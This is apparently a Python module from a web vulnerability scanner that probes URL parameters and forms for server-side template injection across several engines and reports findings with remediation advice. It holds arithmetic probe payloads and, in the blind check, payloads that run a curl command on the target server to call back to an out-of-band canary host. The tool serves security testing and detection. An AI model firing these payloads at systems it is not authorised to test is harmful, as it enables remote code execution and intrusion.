import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch
from scanner.utils.payloads import load_payloads

_HARDCODED = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker/Thymeleaf"),
    ("#{7*7}", "49", "Pebble/Spring EL"),
    ("<%= 7*7 %>", "49", "ERB/EJS"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("${{7*7}}", "49", "Jinja2 (alt)"),
    ("{7*7}", "49", "Smarty"),
    ("{{config}}", "Config(", "Jinja2 (config object)"),
    ("{{self}}", "<TemplateReference", "Jinja2 (self ref)"),
]

def _get_payloads() -> List[tuple]:
    data = load_payloads("ssti")
    if data and isinstance(data.get("payloads"), list):
        try:
            return [(p["payload"], p["expected"], p["engine"]) for p in data["payloads"]]
        except (KeyError, TypeError):
            pass
    return _HARDCODED

# (payload, expected_result, engine_hint)
PAYLOADS = _get_payloads()


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []
    _test_url_params(page, client, findings)
    _test_forms(page, client, findings)

    # Blind SSTI via OOB HTTP callback (Jinja2/Twig can make network requests)
    if oob and not findings:
        canary = oob.get_canary()
        oob_payloads = [
            f"{{% import 'os' %}}{{% set _ = os.popen('curl http://{canary}/ssti').read() %}}",
            f"#{{\"http://{canary}/ssti\".toURL().text}}",
        ]
        from scanner.utils.http import get_url_params, inject_url_param
        params = get_url_params(page.url)
        for param_name in params:
            for payload in oob_payloads:
                try:
                    client.get(inject_url_param(page.url, param_name, payload), timeout=5)
                except Exception:
                    pass

    return findings


def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    params = get_url_params(page.url)
    for param_name in params:
        for payload, expected, engine in PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp and expected in resp.text:
                findings.append(_finding(page.url, param_name, payload, expected, engine))
                break


def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [i["name"] for i in form["inputs"] if i["name"]]
        if not input_names:
            continue
        for payload, expected, engine in PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp and expected in resp.text:
                findings.append(_finding(form["action"], input_names[0], payload, expected, engine))
                break


def _finding(url: str, param: str, payload: str, expected: str, engine: str) -> Finding:
    return Finding(
        title=f"Server-Side Template Injection (SSTI) — {engine}",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"Template expression `{payload}` evaluated to `{expected}` in response",
        description=(
            "SSTI allows attackers to inject template directives that are executed server-side, "
            "often leading to Remote Code Execution (RCE) and full server compromise."
        ),
        remediation=(
            "Never pass user input directly to a template engine. "
            "Use sandboxed rendering if user content must be templated. "
            "Validate and escape all inputs before use in templates."
        ),
        cwe="CWE-1336",
        cvss=9.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a"],
        confidence=1.0,
    )
